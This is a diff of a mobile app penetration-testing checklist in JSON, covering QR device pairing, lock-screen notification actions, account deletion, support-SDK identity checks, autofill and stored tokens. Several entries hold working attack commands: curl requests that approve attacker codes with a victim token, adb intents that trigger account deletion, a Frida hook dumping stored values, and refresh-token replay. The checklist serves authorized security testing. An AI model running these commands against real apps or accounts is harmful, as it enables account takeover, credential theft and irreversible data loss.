    "ruled_out_when": "The prompt is bound to a native `CryptoObject` (the JS layer only *displays* the result of a native key operation), **and** the OTA channel enforces signature verification (`mPublicKey` set for CodePush; unsigned manifests disallowed for expo-updates). Show the chain for the OTA variant, not just the channel — an unsigned update channel with no auth logic in the bundle is a D17 finding, not a D13 one."
@@ -3780,8 +3969,11 @@
     "AM-05"
    ],
    "applies_to": "All apps with push, device management, or \"trusted device\" MFA",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api, push",
+   "requires_tags": [
+    "backend-api",
+    "push"
+   ],
    "maps_to": "API1:2023 (the device record is an object with an owner); API2:2023",
    "record": "",
    "legacy_meta": {},
@@ -3828,8 +4020,10 @@
     "AM-02"
    ],
    "applies_to": "Apps with a web/TV/desktop companion, multi-device support, or E2EE messaging",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "ATT&CK **T1676 Linked Devices** (new in ATT&CK v18; \"Adversaries may use Phishing techniques to trick the user into scanning a quick-response (QR) code, which is used to link the user's Signal and/or WhatsApp account to an adversary-controlled device\"; the QR codes \"masquerade as group invites, security alerts, or pairing instructions\"; Sandworm Team and Star Blizzard cited); T1660 Phishing (quishing)",
    "record": "",
    "legacy_meta": {},
@@ -3854,7 +4048,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Three failure modes in the pairing flow, plus three in the linking flow. **Pairing:** the QR payload is guessable or enumerable; the approval endpoint does not bind the approval to the scanning device or to a freshly-proved user presence; the pending session is issued *before* the user confirms. **Linking:** does linking require a step-up at the moment of linking; are existing devices notified; does an E2EE product surface the new device's key fingerprint?",
-   "how": "```bash\ngrep -rnE 'loginToken|device_code|user_code|pairing|approveSession|qr_login|link_device|authorize_device|polling' jadx_out/sources\ngrep -rnE 'linkDevice|pairDevice|addDevice|device_key|identity_key|safety_number|fingerprint|sender_key|prekey' jadx_out/sources\nzbarimg pairing.png                     # decode what the companion surface displays\n# a) approve a token you GENERATED, not one you scanned\ncurl -s -X POST https://api.target/v1/auth/qr/approve -H \"Authorization: Bearer $VICTIM_APP_TOKEN\" \\\n  -d '{\"code\":\"<attacker-generated or guessed>\"}' -i\n# b) poll with the attacker's code from anywhere\ncurl -s \"https://api.target/v1/auth/qr/poll?code=<code>\" -i\n# c) add a device with only a bearer token\ncurl -s -X POST https://api.target/v1/devices -H \"Authorization: Bearer $TOKEN\" \\\n  -d '{\"name\":\"attacker\",\"pubkey\":\"...\"}' -i\ncurl -s https://api.target/v1/devices -H \"Authorization: Bearer $VICTIM\" | jq\n```",
+   "how": "```bash\ngrep -rnE 'loginToken|device_code|user_code|pairing|approveSession|qr_login|link_device|authorize_device|polling' $DEC/jadx/sources\ngrep -rnE 'linkDevice|pairDevice|addDevice|device_key|identity_key|safety_number|fingerprint|sender_key|prekey' $DEC/jadx/sources\nzbarimg pairing.png                     # decode what the companion surface displays\n# a) approve a token you GENERATED, not one you scanned\ncurl -s -X POST https://api.target/v1/auth/qr/approve -H \"Authorization: Bearer $VICTIM_APP_TOKEN\" \\\n  -d '{\"code\":\"<attacker-generated or guessed>\"}' -i\n# b) poll with the attacker's code from anywhere\ncurl -s \"https://api.target/v1/auth/qr/poll?code=<code>\" -i\n# c) add a device with only a bearer token\ncurl -s -X POST https://api.target/v1/devices -H \"Authorization: Bearer $TOKEN\" \\\n  -d '{\"name\":\"attacker\",\"pubkey\":\"...\"}' -i\ncurl -s https://api.target/v1/devices -H \"Authorization: Bearer $VICTIM\" | jq\n```",
    "proof": "The attacker's polling endpoint returning a full session token for the victim's account after the victim scanned or approved an **attacker-supplied** code — show the resulting `/me`. Or a device added with only a bearer token, no step-up prompt on the primary device, no notification, and that device subsequently receiving messages or transactions. Screenshot the victim account's linked-device list showing your device.",
    "escalation": "Persistence — the link survives a password change unless explicitly revoked; test that. Pair with D09: if the pairing screen itself is reachable via a deep link, the phish is one click. A printed QR delivers the attacker's code with no digital channel at all.",
    "ruled_out_when": "The pairing code is high-entropy and single-use, the approval is bound to the scanning device and to a fresh authentication, the session is issued only after explicit confirmation, linking requires a step-up, existing devices are notified out of band, and the linked-device list is visible and revocable. Those are the controls to demand; enumerate which are present."
@@ -3874,8 +4068,12 @@
     "AM-10"
    ],
    "applies_to": "All. **State the device's lock-screen notification setting in the report, because the vendor will ask**",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "device, physical, push",
+   "requires_tags": [
+    "device",
+    "physical",
+    "push"
+   ],
    "maps_to": "ATT&CK T1517 Access Notifications; MASWE-0037; MASTG-TEST-0315; `Settings.Secure.lock_screen_allow_remote_input`",
    "record": "",
    "legacy_meta": {},
@@ -3905,7 +4103,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "The corpus covers notification *content* on the lock screen and `RemoteInput` PendingIntent mutability separately. The untested combination is whether a person can **act** with the phone locked — reply to a message as the victim, approve a login, accept a transfer, mark a 2FA prompt as \"yes it's me\" — using only the notification's own buttons.",
-   "how": "```bash\nadb shell input keyevent 26                       # lock\n# trigger the notification (send the victim a message / start a login on another device)\nadb shell input keyevent 224; adb exec-out screencap -p > lock.png\nadb shell input tap <x> <y>; adb shell input text \"sent-from-lockscreen\"\nadb shell dumpsys notification --noredact | grep -A20 'com.target.app' \\\n  | grep -iE 'RemoteInput|actions|visibility|VISIBILITY_'\nadb shell settings get secure lock_screen_allow_remote_input\ngrep -rnE 'setVisibility\\(|VISIBILITY_SECRET|VISIBILITY_PRIVATE|setPublicVersion|addAction\\(|RemoteInput\\.Builder' jadx_out/sources\n```",
+   "how": "```bash\nadb shell input keyevent 26                       # lock\n# trigger the notification (send the victim a message / start a login on another device)\nadb shell input keyevent 224; adb exec-out screencap -p > lock.png\nadb shell input tap <x> <y>; adb shell input text \"sent-from-lockscreen\"\nadb shell dumpsys notification --noredact | grep -A20 'com.target.app' \\\n  | grep -iE 'RemoteInput|actions|visibility|VISIBILITY_'\nadb shell settings get secure lock_screen_allow_remote_input\ngrep -rnE 'setVisibility\\(|VISIBILITY_SECRET|VISIBILITY_PRIVATE|setPublicVersion|addAction\\(|RemoteInput\\.Builder' $DEC/jadx/sources\n```",
    "proof": "The reply delivered or the login approved, on video with the lock screen visible throughout, and the recipient side showing the message attributed to the victim. Record `lock_screen_allow_remote_input` alongside it.",
    "escalation": "A lock-screen-approvable 2FA prompt turns a stolen locked phone into an ATO → D13-064. → D24 for the push-payload side.",
    "ruled_out_when": "Sensitive notifications set `VISIBILITY_SECRET` with a redacted `setPublicVersion`, and any action that mutates state requires device unlock (the `PendingIntent` launches an activity that demands authentication rather than performing the action directly). Distinguish the two halves: content disclosure on the lock screen is the lesser finding; *acting* while locked is the report."
@@ -3927,8 +4125,10 @@
     "AM-03"
    ],
    "applies_to": "All apps offering in-app account deletion — a Play requirement for apps with accounts",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "ATT&CK T1640 Account Access Removal, T1629.002 Device Lockout, T1642 Endpoint Denial of Service",
    "record": "",
    "legacy_meta": {},
@@ -3956,7 +4156,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Deletion is the most destructive action in the app and is often a plain authenticated `DELETE` behind a confirmation dialog only. Two questions: does the API require a password, biometric or OTP; and is the deletion activity or in-app route reachable from **outside** — an exported activity, a deep link, a notification `PendingIntent`, or a WebView `loadUrl` to an internal route?",
-   "how": "```bash\ngrep -rnE 'deleteAccount|closeAccount|DELETE.*\\/(me|account|users)|DeactivateActivity|ConfirmDeletionActivity' jadx_out/sources\ngrep -nE 'android:exported=\"true\"' -B4 out/AndroidManifest.xml | grep -iE 'delete|deactivate|close'\nadb shell am start -n com.target.app/.settings.DeleteAccountActivity --ez confirmed true\nadb shell am start -a android.intent.action.VIEW -d 'target://settings/delete-account?confirm=1'\ncurl -s -X DELETE https://api.target/v1/me -H \"Authorization: Bearer $TOKEN\" -i   # no password field\n```",
+   "how": "```bash\ngrep -rnE 'deleteAccount|closeAccount|DELETE.*\\/(me|account|users)|DeactivateActivity|ConfirmDeletionActivity' $DEC/jadx/sources\ngrep -nE 'android:exported=\"true\"' -B4 out/AndroidManifest.xml | grep -iE 'delete|deactivate|close'\nadb shell am start -n com.target.app/.settings.DeleteAccountActivity --ez confirmed true\nadb shell am start -a android.intent.action.VIEW -d 'target://settings/delete-account?confirm=1'\ncurl -s -X DELETE https://api.target/v1/me -H \"Authorization: Bearer $TOKEN\" -i   # no password field\n```",
    "proof": "200/204 on the deletion call with only a session token, or the deletion activity completing from an `am start` or a deep link — then `GET /me` returning 401/404 and the account no longer logging in. **Record the whole sequence; deletion is unrecoverable, so run it only against a throwaway account you own.**",
    "escalation": "A one-tap deletion deep link posted in a chat is a wormable griefing primitive (→ D09). Where the app holds device admin (D03), the adjacent primitive is `DevicePolicyManager.lockNow()`, which is the Critical variant of the same \"remove the user's access\" pattern.",
    "ruled_out_when": "Deletion requires a step-up the server validates, the activity is not exported and not deep-link-reachable, and no `confirmed=true`-style parameter short-circuits the confirmation. Check the exported surface separately from the API — an app that guards the API correctly can still ship an exported confirmation activity."
@@ -3976,8 +4176,10 @@
     "AM-01"
    ],
    "applies_to": "All",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-idor` Chain 5 (soft-delete plus post-removal token validity); ATT&CK T1640",
    "record": "",
    "legacy_meta": {},
@@ -4022,8 +4224,10 @@
     "AM-05"
    ],
    "applies_to": "All apps embedding Intercom / Zendesk Messaging / Freshchat / Helpshift",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`developers.intercom.com/installing-intercom/android/identity-verification` — `Intercom.client().setUserHash(...)`, HMAC-SHA256 over the user id or email, secret kept \"in a secure place on your app server\", 401 on failure; public reporting of an SDK minting JWTs from \"hardcoded secrets with sequential account IDs\" enumerable \"without triggering rate limiting or account lockout\"",
    "record": "",
    "legacy_meta": {},
@@ -4047,7 +4251,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Support SDKs authenticate the end user with an HMAC or JWT the vendor requires to be produced **server-side**. If identity verification is off, or the secret ships in the APK so the client can compute it, any user can register as any other user and read their entire support history — which routinely contains order numbers, addresses, partial card data and account-recovery correspondence.",
-   "how": "```bash\ngrep -rnE 'setUserHash|Intercom\\.client\\(\\)|registerIdentifiedUser|Zendesk.*loginUser|jwtToken|authenticat(e|ion)Token|Freshchat.*restoreId|identity_verification' jadx_out/sources\ngrep -rnE '[A-Za-z0-9_-]{32,}' out/res/values/strings.xml | grep -iE 'intercom|zendesk|freshchat|helpshift'\ngrep -rn 'Jwts\\.builder\\|SignatureAlgorithm\\.HS256\\|HmacSHA256\\|io/jsonwebtoken\\|setIdentity' jadx_out/sources\n# then, in Burp, replay registration with a different user id and no/forged hash\n```\nIf a hash is present, test whether it is server-issued: change the device's user id and see whether the app still produces a valid hash **offline** — it can only do so if the secret is local.",
+   "how": "```bash\ngrep -rnE 'setUserHash|Intercom\\.client\\(\\)|registerIdentifiedUser|Zendesk.*loginUser|jwtToken|authenticat(e|ion)Token|Freshchat.*restoreId|identity_verification' $DEC/jadx/sources\ngrep -rnE '[A-Za-z0-9_-]{32,}' out/res/values/strings.xml | grep -iE 'intercom|zendesk|freshchat|helpshift'\ngrep -rn 'Jwts\\.builder\\|SignatureAlgorithm\\.HS256\\|HmacSHA256\\|io/jsonwebtoken\\|setIdentity' $DEC/jadx/sources\n# then, in Burp, replay registration with a different user id and no/forged hash\n```\nIf a hash is present, test whether it is server-issued: change the device's user id and see whether the app still produces a valid hash **offline** — it can only do so if the secret is local.",
    "proof": "The support SDK returning another user's conversation list or history after registering with that user's id — screenshot of the loaded conversation plus the request showing the substituted id. With identity verification enabled and server-side, the vendor returns **401** instead.",
    "escalation": "Combine with the support-WebView item in D10 and with D15 support-ticket IDOR. Where agents perform password resets from the thread, this is a social-engineering path to full ATO.",
    "ruled_out_when": "Registration without a valid hash returns 401, and changing the user id on-device cannot produce a valid hash (no secret in the binary, no offline HMAC). If you do find a secret, verify the current SDK behaviour yourself before asserting it in a report, and do not cite a CVE where none was assigned."
@@ -4068,8 +4272,11 @@
     "AM-08"
    ],
    "applies_to": "Autofill framework from **Android 8.0 (API 26)**; the service side requires `BIND_AUTOFILL_SERVICE`",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "webview, device",
+   "requires_tags": [
+    "webview",
+    "device"
+   ],
    "maps_to": "`guide/topics/text/autofill-services` — \"Verify package identity before sending data to untrusted packages\"; \"Data partitioning: organize data into logical groups (credentials, address, payment) and avoid exposing data from multiple partitions in a single dataset\"; the explicit warning that filling into WebView fields is risky \"as compromised web content could capture autofilled data\"; `android:importantForAutofill` values `auto`/`yes`/`no`/`yesExcludeDescendants`/`noExcludeDescendants`; MASWE-0019 (Lack of Auto-fill Support for Credential Providers, CWE-287/522), MASVS-AUTH-1",
    "record": "",
    "legacy_meta": {},
@@ -4101,7 +4308,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Two sides. **Client:** a password, OTP or CVC field left at `importantForAutofill=\"auto\"` participates in autofill, and if it is hosted in a WebView the filled value is reachable by the loaded content. **Service** (when the target *is* an autofill or credential provider): does it verify the requesting package's signing identity before returning a dataset, and does it partition credentials from payment data?",
-   "how": "```bash\ngrep -rn 'importantForAutofill\\|setAutofillHints\\|autofillHints\\|AUTOFILL_HINT_' jadx_out/sources/ out/res/layout/\ngrep -rn 'BIND_AUTOFILL_SERVICE\\|android.service.autofill.AutofillService' out/AndroidManifest.xml\ngrep -rn 'CredentialManager\\|GetCredentialRequest\\|allowedProviders\\|preferImmediatelyAvailableCredentials' jadx_out/sources\ngrep -rn 'setAllowFileAccess\\|loadUrl(\\|shouldOverrideUrlLoading\\|setJavaScriptEnabled' jadx_out/sources\n```\nThen, for the Credential Manager variant, navigate the WebView to an off-origin URL — via a deep link, an open redirect in the loaded site, or a bridge method — and attempt the credential flow.",
+   "how": "```bash\ngrep -rn 'importantForAutofill\\|setAutofillHints\\|autofillHints\\|AUTOFILL_HINT_' $DEC/jadx/sources/ out/res/layout/\ngrep -rn 'BIND_AUTOFILL_SERVICE\\|android.service.autofill.AutofillService' out/AndroidManifest.xml\ngrep -rn 'CredentialManager\\|GetCredentialRequest\\|allowedProviders\\|preferImmediatelyAvailableCredentials' $DEC/jadx/sources\ngrep -rn 'setAllowFileAccess\\|loadUrl(\\|shouldOverrideUrlLoading\\|setJavaScriptEnabled' $DEC/jadx/sources\n```\nThen, for the Credential Manager variant, navigate the WebView to an off-origin URL — via a deep link, an open redirect in the loaded site, or a bridge method — and attempt the credential flow.",
    "proof": "Three variants. *(client)* A password/OTP/CVC field autofilled into a WebView-hosted form, shown by triggering the autofill picker over that field and capturing the fill. *(Credential Manager)* The credential sheet appearing for the legitimate RP while the WebView sits on an attacker-controlled origin — evidence it with `WebView.getUrl()` hooked in Frida. *(service)* A dataset containing credentials returned to a stub app that merely declares a matching field, with no signature check on the requesting package.",
    "escalation": "→ D10 (the WebView and its bridge) → D13-072 (passkey origin binding) → credential theft.",
    "ruled_out_when": "Sensitive fields are `importantForAutofill=\"no\"` or `noExcludeDescendants`, no credential flow is initiated from a WebView whose origin the app does not control, and (for a service) the dataset is withheld until `checkSignatures()`-style package verification passes. Note the severity honesty on the *absence* of autofill support: \"the login form does not support password managers\" is Informational-to-Low on its own; report it only when it forces the credential through the clipboard, and chain it to the clipboard item in D20."
@@ -4124,8 +4331,11 @@
     "AM-12"
    ],
    "applies_to": "All",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "device, backend-api",
+   "requires_tags": [
+    "device",
+    "backend-api"
+   ],
    "maps_to": "Android developer security-tips, Credentials section (verbatim): \"If you must use traditional password authentication, don't store user IDs and passwords on the device. Instead, perform initial authentication using the username and password supplied by the user, and then use a short-lived, service-specific authorization token\"; and \"Before passing credentials to an `Account` retrieved with `AccountManager`, verify the signing identity of the calling application so that you don't inadvertently pass credentials to a malicious or unauthorized app\"; MASWE-0024; Indusface \"Remember Me Functionality\"",
    "record": "",
    "legacy_meta": {},
@@ -4157,7 +4367,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "What is actually at rest — a password, a long-lived refresh token, an `AccountManager` credential, or a short-lived service token? And does the app verify the caller's signing identity before handing a credential out of `AccountManager`?",
-   "how": "```bash\nadb shell run-as com.target.app grep -rlniE 'password|refresh_token|client_secret|remember|device_token|eyJ[A-Za-z0-9_-]{10,}' shared_prefs databases files 2>/dev/null\nadb shell run-as com.target.app cat shared_prefs/*.xml\ngrep -rn 'AccountManager\\|addAccountExplicitly\\|getPassword\\|peekAuthToken\\|getAuthToken\\|setPassword\\|checkSignatures' jadx_out/sources\n```\nTrace one token end to end so the report is a chain of identical strings rather than an assertion:\n```bash\nfrida-trace -U -p $(adb shell pidof -s com.target.app) -j '*!*token*/iu' -o token.log\n```\n```js\nJava.perform(function () {\n  // hook the CONCRETE class: android.content.SharedPreferences$Editor is an interface and records nothing\n  var E = Java.use('android.app.SharedPreferencesImpl$EditorImpl');\n  E.putString.implementation = function (k, v) {\n    console.log('[prefs.putString] ' + k + ' = ' + v); return this.putString(k, v);\n  };\n});\n```\nThen replay from a different device, IP and User-Agent:\n```bash\ncurl -i -X POST https://api.target/v1/token/refresh -d \"refresh_token=$VALUE\"\ncurl -i -H \"Authorization: Bearer $VALUE\" https://api.target/v1/me\n```",
+   "how": "```bash\nadb shell run-as com.target.app grep -rlniE 'password|refresh_token|client_secret|remember|device_token|eyJ[A-Za-z0-9_-]{10,}' shared_prefs databases files 2>/dev/null\nadb shell run-as com.target.app cat shared_prefs/*.xml\ngrep -rn 'AccountManager\\|addAccountExplicitly\\|getPassword\\|peekAuthToken\\|getAuthToken\\|setPassword\\|checkSignatures' $DEC/jadx/sources\n```\nTrace one token end to end so the report is a chain of identical strings rather than an assertion:\n```bash\nfrida-trace -U -p $(adb shell pidof -s com.target.app) -j '*!*token*/iu' -o token.log\n```\n```js\nJava.perform(function () {\n  // hook the CONCRETE class: android.content.SharedPreferences$Editor is an interface and records nothing\n  var E = Java.use('android.app.SharedPreferencesImpl$EditorImpl');\n  E.putString.implementation = function (k, v) {\n    console.log('[prefs.putString] ' + k + ' = ' + v); return this.putString(k, v);\n  };\n});\n```\nThen replay from a different device, IP and User-Agent:\n```bash\ncurl -i -X POST https://api.target/v1/token/refresh -d \"refresh_token=$VALUE\"\ncurl -i -H \"Authorization: Bearer $VALUE\" https://api.target/v1/me\n```",
    "proof": "The identical string appearing in the network response (Burp), in `putString` (Frida), in `shared_prefs/auth.xml` (objection `filesystem cat`), and — where applicable — in a log line or an implicit broadcast; **then** a new access token issued to a different device using the extracted refresh token. That final replay is what moves the report out of the P5 storage band into P1.",
    "escalation": "→ D11 (the storage primitive), D02 (backup extraction), D07/D08 (the cross-app retrieval vector), D13-020 (does it rotate?), D13-019 (does it survive a password change?).",
    "ruled_out_when": "Only a short-lived, service-specific token is at rest; no password, no `client_secret`, and no non-rotating refresh token; `AccountManager` callers are checked with `checkSignatures()`; and the stored token is refused when replayed from a different device after the local session ends. Apply the D13-010 artefact exclusions before concluding the replay failed for binding reasons."
